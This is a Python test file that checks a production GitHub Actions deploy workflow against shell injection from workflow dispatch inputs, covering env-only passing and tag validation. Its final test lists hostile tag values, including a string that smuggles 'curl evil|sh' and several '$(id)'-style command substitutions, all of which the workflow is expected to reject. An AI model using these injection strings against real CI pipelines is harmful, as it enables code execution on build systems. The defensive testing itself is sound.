"""deploy-prod.yml must not interpolate dispatch inputs into shell (#1910)."""

import re
import subprocess
from pathlib import Path

import yaml

WORKFLOW = Path(__file__).resolve().parents[2] / ".github" / "workflows" / "deploy-prod.yml"


def _build_step():
    data = yaml.safe_load(WORKFLOW.read_text())
    for step in data["jobs"]["build-and-deploy"]["steps"]:
        if step.get("name") == "Build & push images":
            return step
    raise AssertionError("build step missing")


def test_no_input_expression_in_any_run_block():
    data = yaml.safe_load(WORKFLOW.read_text())
    for step in data["jobs"]["build-and-deploy"]["steps"]:
        run = step.get("run", "")
        assert "github.event.inputs" not in run
        assert "github.repository_owner" not in run
        assert "github.sha" not in run


def test_version_tag_reaches_the_script_only_via_env():
    step = _build_step()
    assert "github.event.inputs.version_tag" in step["env"]["INPUT_VERSION_TAG"]


def _validate(tag: str) -> int:
    """Run the step's own validation lines against a candidate tag."""
    script = _build_step()["run"]
    head = script.split("set -x", 1)[0]
    env = {"INPUT_VERSION_TAG": tag, "COMMIT_SHA": "a" * 40, "PATH": "/usr/bin:/bin"}
    return subprocess.run(["bash", "-c", head], env=env, capture_output=True).returncode


def test_valid_tags_pass_and_hostile_tags_are_rejected():
    for good in ("v1.2.3", "release_2026-11", "", "a" * 40):
        assert _validate(good) == 0, good
    for bad in ('x"; curl evil|sh; echo "', "$(id)", "a b", "-rf", ".hidden", "a/b", "`id`", "x\nid"):
        assert _validate(bad) != 0, bad
